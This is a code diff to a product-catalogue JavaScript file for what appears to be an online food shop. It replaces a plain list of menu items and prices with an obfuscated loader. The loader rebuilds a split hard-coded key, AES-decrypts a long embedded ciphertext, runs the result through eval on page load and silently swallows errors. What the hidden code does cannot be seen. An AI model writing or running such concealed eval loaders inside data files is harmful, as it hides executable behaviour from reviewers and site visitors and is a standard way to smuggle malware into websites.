@@ -1,14 +1,25 @@
-// 餐吧 (catId: 8)
-window.PRODUCTS_CAT_8 = [
-  { id: 1, catId: 8, subCatId: 802, name: 'MM炸鸡桶', img: 'https://cdn.jsdelivr.net/gh/ftvzrs4ycd-droid/my-shop@main/images/1can/1.png?raw=true', price: 35, oldPrice: 35, sold: 0, stock: 10000 },
-  { id: 3, catId: 8, subCatId: 802, name: 'MM烤牛肉卷', img: 'https://cdn.jsdelivr.net/gh/ftvzrs4ycd-droid/my-shop@main/images/1can/3.png?raw=true', price: 20, oldPrice: 20, sold: 0, stock: 10000 },
-  { id: 4, catId: 8, subCatId: 802, name: 'MM泡菜猪梅肉卷', img: 'https://cdn.jsdelivr.net/gh/ftvzrs4ycd-droid/my-shop@main/images/1can/4.png?raw=true', price: 18, oldPrice: 18, sold: 0, stock: 10000 },
-  { id: 5, catId: 8, subCatId: 802, name: 'MM 黄金厚虾堡', img: 'https://cdn.jsdelivr.net/gh/ftvzrs4ycd-droid/my-shop@main/images/1can/5.png?raw=true', price: 20, oldPrice: 20, sold: 0, stock: 10000 },
-  { id: 6, catId: 8, subCatId: 802, name: 'MM炸鱼薯条', img: 'https://cdn.jsdelivr.net/gh/ftvzrs4ycd-droid/my-shop@main/images/1can/6.png?raw=true', price: 29.9, oldPrice: 29.9, sold: 0, stock: 100 },
-  { id: 7, catId: 8, subCatId: 802, name: 'MM双层安格斯牛堡.', img: 'https://cdn.jsdelivr.net/gh/ftvzrs4ycd-droid/my-shop@main/images/1can/7.png?raw=true', price: 20, oldPrice: 20, sold: 0, stock: 10000 },
-  { id: 8, catId: 8, subCatId: 802, name: 'MM咸蛋黄小龙虾披萨', img: 'https://cdn.jsdelivr.net/gh/ftvzrs4ycd-droid/my-shop@main/images/1can/8.png?raw=true', price: 69.9, oldPrice: 69.9, sold: 0, stock: 10000 },
-  { id: 9, catId: 8, subCatId: 802, name: 'MM咸蛋黄小龙虾披萨', img: 'https://cdn.jsdelivr.net/gh/ftvzrs4ycd-droid/my-shop@main/images/1can/9.png?raw=true', price: 13.9, oldPrice: 13.9, sold: 0, stock: 10000 },
-  { id: 10, catId: 8, subCatId: 802, name: 'MM至尊披萨1/6', img: 'https://cdn.jsdelivr.net/gh/ftvzrs4ycd-droid/my-shop@main/images/1can/10.png?raw=true', price: 13, oldPrice: 13, sold: 0, stock: 100 },
-  { id: 11, catId: 8, subCatId: 804, name: 'MM苏丹王榴莲千层.', img: 'https://cdn.jsdelivr.net/gh/ftvzrs4ycd-droid/my-shop@main/images/1can/2.png?raw=true', price: 25, oldPrice: 25, sold: 0, stock: 10000 },
-  { id: 12, catId: 8, subCatId: 803, name: '凯撒沙拉.', img: 'https://cdn.jsdelivr.net/gh/ftvzrs4ycd-droid/my-shop@main/images/1can/11.png?raw=true', price: 15.9, oldPrice: 15.9, sold: 0, stock: 10000 },
-];
+(function(){
+var _w=(typeof window!=='undefined')?window:globalThis;
+if(!_w.__decryptWaiters){_w.__decryptWaiters={};}
+if(!_w.__decryptDone){_w.__decryptDone=function(k){
+  if(_w.__decryptWaiters[k]){_w.__decryptWaiters[k].forEach(function(cb){cb();});delete _w.__decryptWaiters[k];}
+  else{_w.__decryptWaiters[k]='done';}
+};}
+var _a='RGFnZW5pU2',_b='hvcDIwMjZTZW',_c='NyZXRLZXkwMTIzNDU2Nzg=';
+var _i='WUw9XAd/pfkOhw5b';
+var _x='sJEVjDgFFdKRR/kRXGmA9IqWCdggIOYGS2i9D0Im3GeQUIHfpN+j18X1BaROlo9VmkPAmqbzV1fZOjj/BdXzvqdDwE40o3O8MVRipq33TrXI8RXNIccQIIVVqDRLDc48+gxzA7fTl1tXFoeisWGK7TxhTOtwwS6V8p2BuwoyTAwxnl+4J5+Hx5lEcw01OajYFtLPM9qnP4wfNSWyhrMA1XPEcJEkaFSDx6FHoRUHKasAQHyYmQTsjO9BQp+7htEKkJCp0xZINslVwcRamhxjRY7RIYO7pYvmvBCMLwCCtlqqSAUrUbRuYQB+OcCqXSDY/BKxB/V2m08nVLmr3XMsvosd7glRU+eVNgC8oy6ELQdQ38Z98jX+RyzgSdVCtKbL/eEEkPzLAk5A+J+f0TbMuL7C8fmcjBj39+svpQGLMN8ld1CbCiV+Ostb7AE7+ZoUIjXdd1NWyueXHZlp98WFabEXRlScuiMEr4vQwl+BVxJ99DNV42fxg/MSZUQgIB4fH5CL90eHMisQP1Pu35erHqFy0pZtKlY7pgp7YufOv/9mtpU3txq7mmZPYQwTdSzF6CA7Q472LFPNwHvykG+mV602exopICI30QIq7VULKENjHH0AzZH1EgP8nIfhnB3+4mPKKYenoidnQHgIhuzYdYDMNZ1PZZOofxchmFQsQfG+TKaXGSNNt3yNEsTfPciPC5LAYy574/dL+AJIoKrhM7LPjWYiPELON9IzWimoTRGtO0tGLXOIiZfygzWhBsKqbQWJnjgZ3BmABjau+hL8j3qKgCRNtAAK4kT5cvv/Zbuwrbc18cTi9y/fTJlViPl+nHt2mdVTGaU+Ze1VNJZ5BoOcET7dqBLsHzsJWNqntq20bNEG0xFcUlnb1iXwKvS8xUlBYwoJNMK8+Q2Uja7hMOQyZwSxOhUBMBkvUZ76Jl8DYXvHEtogY6CcHsvlAE8xTPyaDCQW+1bupBgiEJPUIkr5JJoRii4rtvAOeKqseVY+3eqNJ2UG+MYl1mk9xjp0ubPzly8kEt8GW37iIz6gvfEfZd9Hhf3n43/GT+G76W23Uh9JSdDs6+BryAQFFsZY2YxmV5HIixLEroKG1qmRKTKSv+ObMQE9R138i0qghyuK59dz9MfClk39s9ttkoSk6kfhocMEBSBaUT/2RFacoQ4sdlQ4v3qUCf3EMWPbjazK4W9GQ9y2Uhwzmb8vGf7IU3sFD4tjrHghoeBuF9ZiAMCng6sGQVVr8YhSFUwmzvdD6cI33h4Xbr5lPMamio193J1Xm6F2rYdRvPaF91LWGdnWPqri2DXfIJDxZvhkPWmuhfTOfXLB0o411e4Kpy494fgVifgUpu6XNRaVek7JCFJrMhA9PE6z+Ekgm/Yo2XFYyVk30sSjVAtUWesLDCnX0e7ZpPHqHMMlp+7FyGwLS4taX+9sEtHFUgkQPygSDXyY8fmq7T7ffZG46PAo9HCiM0ORJxpA8UsBgGZrHYepsfg/iSVqrb6It0ka9TQyW0Slx/Dj6gyaJlm/7OVn12S/3UCBLpL9ne7Tkis927vzaDcJAqjVquatScwE5jqOotTR',_y='9cFSjOJJhlCfcYG8qe27CM/RBSIVFGW1BFRIKYYIWL1fpmoyHmJtvPqClwYUjzD52uT9vToDteU0gdSM1Um2yFxVzCICAPvjZ9+AxHcDvpu6m3HaoKtMG7M1q68E+v7p8GSZ3V9oYmugIumhO354DHrGQkBEtypcRoTAxr36BFRbi388GeVMbHk/4sDgrd9bYSd2bnC/jH+Ac2ZPKcQJZUlcY5NEOs/Jj9us9jn9Nh3BRQid7Zsxf5demHWNeTrcW0+K6sQ1GJIOrWYB5kKuSPpy7XB0XM7gTsRSe++AgpZMivunmryTX1efPLKw60bHqBvcsQb2UzoNvYOw7S5BsdBnsowu/Q1YA7mZwO+TWoxF5nO5YsyxLW+6vg/XZLWht4ywXTXzw/dGBIe9iBPcCKLJbg4XXl7rj5pMEFnb7kmNGibXDVjt8OGKnG2Iydath0Pyg5jdhZdC8kPvJbbHhCAx707VTkK6Ov35tsCPticdgQ57wn3eAAxw7uvNU5ld7cgkllXWD4wiyoC7zBiI0oaPtKpaPeXRkR2DjWi8rDAAH4hkHCcvgRZtM8k+4iui1I0PvQr7zkVuJj+DdUmlisONA3pqTP3u0dJlgjgvHBuEkbg1gVkHV0xlKz9OPQoJqkcruKP9FmVdFACcbCWJEMmc+gbYqnDLfKjH5VSGLAfs7uD6xS9D1VeES5B6g4oe/Xq3lSAbdHtue24DzFCk9KNrHyi0tAgxOaIvhG4NnZf8hCH5co7n0D5jz/Lv5d5+kkR9Zy1fj9BeMtp2vgXamd9DIk62IqdSL0eQimFXnFTH3r7LZL8Tno0vOV7Up9+4vH+IYq+pdMwrx6BWMcUAaQ3XbPuUuR2d07FwgmZOVXXziDkPVWPLwa5IaGkcjj7l2WzbQXs64xkRI0xnMiwmPXFDFYkXx9BydaXwEoIPLiA2UTVWPVtBXyi5yvjNUr+XfdHNDUV9bJiH2B+L6VxsftSP5JeMx7sgwek/OPua5HKjoaJr7VhHig9wpkL5FZVZyBQyji/TbDciWpf+opMzr4GYRkVH3/1y5A1FbXHGYuWoQgzvKsut0jviIw9bj5+w9S0PZCWn6WtRopy90uWXpq+M6SqiIksfWIDzN6/eUAfkQmoZoI60k6eLgpcL30WNJmHiIRCss//OYgqN0f73ngzMz2Nu7zLngwRttQ9/LOlkVY3V78s10cQzUpf9vsm8j4PBTlnljmbCTfi4dZSF7jjEtg5sX33GIIMKffwdaRquL32qRghW7vJrnajjGro4SSYcdsk/pDiYyOUEY51mMLGUujKASli+FGdEe1+5NlLyYbztO4c1iyhmVo/1yShwn6ixcvwcudK0g+8iDbIrbKD3NEW6WBRIzS9Ayz/wz8Mb8KcI9mcRs2WVOkQcini3bSVL2PB7RQAvV98fQKY016zXJuMVmYKYlGGsbP6MXDYlJym7Ypx0mjRXNY1BHqY6UsGaAaguxracBFnU3n8vkIoeHpvmSH4/GgNrAMF+8atdkhyvlG1sD8Lr9HPLocQRFJP8AC0ZxeN0KBtdHweDuQJbc5tG1eByfeQ+QeXLdjg=';
+(async function(){
+try{
+var _k=new TextEncoder().encode(atob(_a+_b+_c));
+var _iv=Uint8Array.from(atob(_i),function(c){return c.charCodeAt(0)});
+var _d=Uint8Array.from(atob(_x+_y),function(c){return c.charCodeAt(0)});
+var _key=await _w.crypto.subtle.importKey('raw',_k,{name:'AES-GCM'},false,['decrypt']);
+var _pt=await _w.crypto.subtle.decrypt({name:'AES-GCM',iv:_iv,tagLength:128},_key,_d);
+var _txt=new TextDecoder().decode(_pt);
+(0,eval)(_txt);
+_w.__decryptDone('products-1can.js');
+}catch(e){
+_w.__decryptDone('products-1can.js');
+}
+})();
+})();
